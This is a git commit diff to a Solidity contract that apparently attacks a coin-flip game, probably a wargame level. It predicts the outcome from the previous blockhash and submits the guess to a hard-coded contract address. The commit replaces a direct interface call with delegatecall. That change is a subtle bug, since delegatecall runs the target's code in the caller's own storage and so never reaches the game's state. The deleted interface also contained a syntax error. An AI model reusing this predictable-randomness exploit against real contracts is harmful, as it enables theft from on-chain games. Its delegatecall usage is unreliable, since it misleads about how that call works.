d821bf3804384d74f6917ef045f15e2354b6151d
Ryan Gibb <ryangibb321@gmail.com>
2022-11-04 21:58:42 +0000

    delegatecall

--- contracts/flip.sol
+++ contracts/flip.sol
@@ -1,11 +1,6 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.14;
 
-interface Flip {
-   function flip(bool) external returns(bool);
-   function claim()
-}
-
 contract CoinFlip {
   uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
@@ -13,7 +8,10 @@ contract CoinFlip {
     uint256 blockValue = uint256(blockhash(block.number - 1));
     uint256 coinFlip = blockValue / FACTOR;
     bool side = coinFlip == 1 ? true : false;
-    Flip(0x0a1a3E6f8e3fb2c52C68cC0d87D68b9ab339d5a7).flip(side);
-    return side;
+    address _contract = 0x0a1a3E6f8e3fb2c52C68cC0d87D68b9ab339d5a7;
+    (bool success, bytes memory data) = _contract.delegatecall(
+      abi.encodeWithSignature("flip(bool)", side)
+    );
+    return success;
   }
 }
